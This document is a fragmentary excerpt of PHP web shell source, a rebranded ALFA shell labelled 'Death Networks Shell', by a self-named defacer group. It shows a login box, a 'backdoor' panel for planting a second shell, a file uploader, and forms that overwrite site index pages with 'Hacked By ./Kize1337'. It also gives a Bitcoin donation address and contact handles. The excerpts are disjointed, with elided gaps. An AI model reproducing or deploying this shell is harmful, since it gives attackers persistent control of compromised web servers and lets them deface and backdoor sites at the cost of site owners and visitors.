...
<title>~ Death Networks Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="Death Networks 2012" draggable="false" src="https://raw.githubusercontent.com/qeize/tools/refs/heads/main/logo.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Death Networks Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
<img src="https://raw.githubusercontent.com/qeize/tools/refs/heads/main/logo.png" draggable="false">
...
<script>
const text = "Welcome To The End - Kize1337";
const speed = 20; 
let i = 0;
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Death Networks Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="Death Networks 2012" draggable="false" src="https://raw.githubusercontent.com/qeize/tools/refs/heads/main/logo.png" /></td>
</tr>
<tr>
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Death Networks is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Death Networks Uploader</option><option value='my'>My Private Shell</option></select>";
...
<font color='#00A220'>Shell Coded By ./Kize1336 (Death Networks)</font><br>
<font color='#00A220'>Contact : ryphon@proton.me</font><br>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./DeathNetworks &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>ryphon[at]proton.me</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/keccy'>@keccy</a></span></div></td>
</tr>
</table>
</div>
...
<textarea name=index rows='19' cols='103'><title>Hacked By ./Kize1336 (Death Networks)</title><b>Hacked By ./Kize1336 (Death Networks)</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name='index' rows='19' cols='103'><title>Hacked By ./Kize1337 (Death Networks)</title><b>Hacked By ./Kize1337 (Death Networks)</b></textarea><br>
...
<title>Hacked By ./Kize1337 (Death Networks)</title><b>Hacked By ./Kize1337 (Death Networks)</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
<input type="text" name="defacer" size="67" id="text" placeholder="Death Networks 2012" />
<br>
